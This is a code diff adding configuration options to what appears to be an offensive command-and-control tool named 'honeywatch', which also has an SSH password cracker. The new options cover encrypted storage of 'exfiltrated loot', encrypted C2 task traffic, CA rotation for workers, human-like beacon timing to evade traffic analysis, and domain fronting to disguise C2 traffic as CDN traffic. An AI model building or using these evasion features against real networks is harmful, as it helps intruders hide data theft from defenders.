@@ -85,6 +85,11 @@ def default_config() -> dict[str, Any]:
         "storage": {
             "db": "honeywatch.db",
             "reports_dir": "reports",
+            # Vault passphrase for encrypting credentials and loot files at rest.
+            # When set, passwords are encrypted with AES-256-GCM (PBKDF2-SHA256
+            # 600k iterations) and exfiltrated loot files are encrypted before
+            # writing to the stash. None = plaintext storage.
+            "vault_passphrase": None,
         },
         "vpn": {
             "required": True,
@@ -124,6 +129,16 @@ def default_config() -> dict[str, Any]:
             # CA-signed workers even complete the TLS handshake. The bearer token
             # remains a second factor at the app layer. None = no mTLS.
             "ca_path": None,
+            # C2 encryption: encrypts task scripts and results with NaCl sealed
+            # boxes or AES-256-GCM. When enabled, workers fetch the controller's
+            # public key from /api/pubkey and encrypt task results before sending.
+            "c2_encrypt": None,
+            "c2_key": None,
+            # CA rotation: when set, generates a new CA cross-signed by the old
+            # one and starts a transition window. Workers fetch the new CA from
+            # /api/ca-rotate during the window. None = no rotation active.
+            "rotate_ca": None,
+            "rotate_transition_hours": 24,
         },
         # ------------------------------------------------------------------ #
         # Controller-to-worker plane
@@ -154,6 +169,17 @@ def default_config() -> dict[str, Any]:
             "worker_cert": None,
             "worker_key": None,
             "ca_pin": None,
+            # Human-like timing: spreads WebSocket recv timeouts across business
+            # hours (shorter waits), evening (medium), and night (longer waits)
+            # to evade time-series traffic analysis. None = disabled.
+            "human_timing": None,
+            # Adaptive timing: adjusts poll interval based on controller RTT.
+            # The beacon backs off exponentially on failures and resets on success.
+            "adaptive_timing": None,
+            # Domain fronting: connect to a CDN front domain (SNI) while setting
+            # the Host header to the real controller. Makes C2 traffic look like
+            # normal CDN traffic to network monitors. None = disabled.
+            "domain_front": None,
         },
         # ------------------------------------------------------------------ #
         # SSH password cracker
